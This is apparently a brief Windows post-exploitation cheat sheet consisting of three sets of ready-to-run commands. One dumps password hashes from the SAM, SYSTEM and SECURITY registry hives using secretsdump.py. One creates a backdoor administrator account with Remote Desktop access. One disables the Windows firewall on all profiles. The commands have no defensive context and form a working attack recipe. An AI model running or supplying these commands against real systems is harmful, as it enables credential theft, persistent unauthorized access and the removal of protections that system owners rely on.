### Dump hashes
````
reg save hklm\sam .\sam
reg save hklm\system .\system
reg save hklm\security .\security

secretsdump.py -sam sam -system system -security security LOCAL > hashes.txt
````
### Add RDP user
````
net user hacker hacker123 /add
net localgroup Administrators hacker /add
NET LOCALGROUP "Remote Desktop Users" hacker /ADD
````
### Turn off firewall 
````
NetSh Advfirewall set allprofiles state off
````
